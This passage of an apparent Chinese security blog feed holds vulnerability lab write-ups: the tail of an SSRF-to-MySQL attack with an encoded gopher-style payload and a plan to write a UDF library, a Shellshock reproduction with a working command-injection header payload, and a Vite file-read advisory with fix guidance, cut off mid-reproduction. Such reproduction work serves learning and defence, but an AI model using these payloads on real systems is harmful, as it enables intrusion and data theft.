class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">31</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>拿到 MySQL 的插件目录为：<code>/usr/lib/mysql/plugin/</code></p><p><img src="/images/ssrf-vul-for-new/image-20250403092510843.png" alt="image-20250403092510843"></p><p>接下来利用思路</p><p>接着来写入动态链接库</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Duoduo-chino/ssrf-vul-for-new/">Duoduo-chino&#x2F;ssrf-vul-for-new: ssrf-vul-for-new</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E8%AE%BE%E8%AE%A1">手把手带你用 SSRF 打穿内网 | 国光</a></p><p><a href="https://www.cnblogs.com/CoLo/p/14214208.html#%E6%8E%A2%E6%B5%8B%E6%BC%8F%E6%B4%9E">SSRF之利用dict和gopher吊打Redis - Zh1z3ven - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf使用教学</tag>
      
      <tag>ssrf打穿内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock-CVE-2014-6271</title>
    <link href="/2025/04/02/Shellshock-CVE-2014-6271/"/>
    <url>/2025/04/02/Shellshock-CVE-2014-6271/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</p><h2 id="漏洞具体成因"><a href="#漏洞具体成因" class="headerlink" title="漏洞具体成因"></a>漏洞具体成因</h2><p>1）Linux Web Server 一般可以提供CGI接口，允许远程执行Bash命令</p><p>2）对于 http 头部，CGI 脚本解析器会将其当作环境变量，调用Bash的env相关函数设置到临时环境变量中</p><p>3）Http 允许发送任意客户端自定义的 HTTP头部</p><p>大家此时有没有想法？</p><p>小白 : 包的呀！</p><p>大神 ：access getshell</p><p>是的，我们可以构造好带攻击命令的HTTP头部到服务器，服务器调用设置环境变量的函数，直接执行了客户端指定头部里面的命令</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>我们使用两个版本进行对比</p><p>一个是Bash4.3 生成的页面，一个是修复版的Bash生成的页面</p><h3 id="victim-cgi"><a href="#victim-cgi" class="headerlink" title="victim.cgi"></a>victim.cgi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/local/bash-4.3.0/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h3 id="safe-cgi"><a href="#safe-cgi" class="headerlink" title="safe.cgi"></a>safe.cgi</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Content-type: text/html&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;html&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/head&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hello world&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/body&gt;&#x27;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;/html&gt;&#x27;</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">() &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-Type: text/plain; <span class="hljs-built_in">echo</span>; /usr/bin/whoami<br></code></pre></td></tr></table></figure><p>解释一下</p><ol><li><code>() &#123; foo; &#125;;</code>：这定义了一个匿名函数，函数体仅包含对 <code>foo</code> 命令的调用。不过，代码里并未对 <code>foo</code> 命令进行定义，所以在执行时会报错。</li><li><code>echo Content-Type: text/plain;</code>：此命令会向标准输出打印 <code>Content-Type: text/plain</code>。在 HTTP 响应里，<code>Content-Type</code> 一般用于表明响应内容的类型。</li><li><code>echo;</code>：该命令会输出一个空行，在 HTTP 响应里，空行用于分隔响应头和响应体。</li><li><code>/usr/bin/whoami</code>：这个命令会输出当前用户的用户名</li></ol><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>victim.cgi</p><p>你没看错执行了！</p><p><img src="/images/image-20250402114915300.png" alt="image-20250402114915300"></p><p>safe.cgi</p><p>没有把攻击命令当作变量执行了</p><p><img src="/images/image-20250402114708372.png" alt="image-20250402114708372"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Shellshock</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vite CVE-2025-30208</title>
    <link href="/2025/03/28/Vite-CVE-2025-30208/"/>
    <url>/2025/03/28/Vite-CVE-2025-30208/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>3 月 24 日，漏洞发现者在 GitHub 安全公告中披露了 Vite 存在的任意文件读取漏洞（漏洞编号：CVE-2025-30208，漏洞级别：高危），该漏洞源于Vite在其开发服务器模式下，提供了<code>@fs</code>机制，用于访问服务允许范围内的文件。对特定 URL 请求的路径校验不严格，导致可以通过在URL请求中添加特定参数（如<code>?raw??</code>或<code>?import&amp;raw??</code>），绕过原有用于阻止越权访问的server.fs.deny访问限制，从而可能读取服务器上的任意文件，包括项目源码、敏感配置文件等，导致严重的数据泄露风险。</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">11</span><br><br><span class="hljs-attribute">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= version &lt;=<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">14</span><br><br><span class="hljs-attribute">version</span> &lt;=<span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Vite</span> &gt;= <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">0</span>.<span class="hljs-number">12</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">15</span> &lt;= Vite &lt; <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">5</span>.<span class="hljs-number">10</span> &lt;= Vite &lt; <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="修复指南"><a href="#修复指南" class="headerlink" title="修复指南"></a>修复指南</h3><p>1.优先升级到官方修复版本</p><p>2.确认当前Vite版本</p><p>项目下使用命令，或者直接查看package.json找到版本号</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> list vite<br></code></pre></td></tr></table></figure><p>3.升级Vite</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">4</span>.<span class="hljs-number">5</span>.<span class="hljs-number">10</span> # 若之前使用的是 <span class="hljs-number">4</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">15</span> # 若之前使用的是 <span class="hljs-number">5</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">12</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">0</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">1</span>.x 版本<br><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span> # 若之前使用的是 <span class="hljs-number">6</span>.<span class="hljs-number">2</span>.x 版本<br></code></pre></td></tr></table></figure><p>4.再次验证保证Vite对于此漏洞修复</p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>1.移除 <code>--host</code> 参数</p><p>如果你在启动开发服务器时使用了 <code>--host</code> 参数，将其移除。例如，将启动命令从：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">npx</span> vite --host <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">npx vite</span><br></code></pre></td></tr></table></figure><p>2.配置 <code>server.host</code></p><p>若在 <code>vite.config.js</code> 或 <code>vite.config.ts</code> 中配置了 <code>server.host</code>，将其注释或修改为仅允许本地访问。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.安装Vite环境</p><p>创建一个项目文件夹，使用CMD</p><p>执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> test <span class="hljs-operator">-</span>y <span class="hljs-comment">-- --template vue-ts</span><br></code></pre></td></tr></table></figure><p><img src="G:\审计\CVE-2025-30208\README\image-20250328084938374.png" alt="image-20250328084938374"></p><p>会得到<code>&quot;vite&quot;: &quot;^6.2.0&quot;</code>，这里的<code>^</code>符号表示安装兼容的最新版本，它允许安装的版本在不改变主版本号的前提下，更新次版本号和补丁版本号。所以如果急着直接执行<code>npm install</code>，所安装的Vite版本会是不受影响的<code>6.2.3</code>。（其他受影响版本同理）。</p><p><strong>这也是官方在依赖管理层面提供的一种便捷修补方式。</strong></p><p>所以这里要进来修改package.json，把 ‘^’ 去掉</p><p>把它搞成受攻击的版本6.2.0</p><p><img src="/images/image-20250328085224706.png" alt="image-20250328085224706"></p><p><img src="/images/image-20250328085553859.png" alt="image-20250328085553859"></p><p><a 